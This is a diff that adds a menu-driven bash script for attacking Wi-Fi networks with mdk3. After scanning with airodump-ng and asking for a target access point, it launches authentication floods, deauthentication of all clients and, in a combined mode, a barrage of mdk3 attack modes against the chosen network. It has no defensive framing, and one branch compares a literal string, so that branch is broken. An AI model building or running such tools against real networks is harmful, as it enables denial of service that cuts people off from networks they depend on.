@@ -1,0 +1,82 @@
+#!/bin/bash
+
+Menu() {
+clear
+echo "[DoS]    Authentication Denial"
+echo "[Deauth] Deauth Everyone"
+echo "$(tput setaf 1)[ButFuk] !!!USE WITH CAUTION!!!"
+echo "$(tput setaf 2)[AP data] Reset AP data"
+echo "[e] exit"
+read -p "~ " route
+input
+}
+
+Data() {
+echo -n "Enter interface for monitoring: "
+read mon
+airodump-ng $mon
+read -p "BSSID: " bssid
+read -p "AP Name: " name
+read -p "Channel: " chan
+read -p "Target Mac: " target
+read -p "Encryption type (WPA=1, WPA2=2): " wpa 
+echo "aight"
+Menu
+}
+
+input() {
+if [[ "$route" == "DoS" ]]
+then
+echo "ok"
+xterm -e mdk3 $mon a &nohup
+xterm -e mdk3 $mon a -a $bssid &nohup
+xterm -e mdk3 $mon a -m -i $bssid &nohup
+Menu
+elif [[ "$route" == "Deauth" ]]
+then
+echo "ok"
+xterm -e mdk3 $mon d &nohup
+xterm -e mdk3 $mon d -c $chan &nohup
+Menu
+elif [[ "route" == "ButFuk" ]]
+then
+echo "ok"
+xterm -e mdk3 $mon a &nohup
+xterm -e mdk3 $mon a -a $bssid &nohup
+xterm -e mdk3 $mon a -m -i $bssid &nohup
+xterm -e mdk3 $mon d &nohup
+xterm -e mdk3 $mon d -c $chan &nohup
+xterm -e mdk3 $mon m -t $bssid &nohup
+xterm -e mdk3 $mon m -t $bssid -j &nohup
+xterm -e mdk3 $mon f -t $bssid &nohup
+xterm -e mdk3 $mon x 0 -t $bssid -w $wpa &nohup
+xterm -e mdk3 $mon x 1 -t $bssid &nohup
+xterm -e mdk3 $mon g -t $bssid &nohup
+xterm -e mdk3 $mon p -t $bssid -e $name &nohup
+xterm -e mdk3 $mon p -t $bssid -e $name -b &nohup
+echo "^C to stop"
+sleep 3
+Menu
+elif [[ $route == "AP data" ]]
+then
+Data
+elif [[ $route == "e" ]]
+then
+exit
+elif [[ -z $route ]]
+then
+echo "Empty command, try again"
+sleep 1.5
+Menu
+else
+echo "Not a command, try again"
+sleep 1.5
+Menu
+fi
+}
+
+Data
+
+
+
+
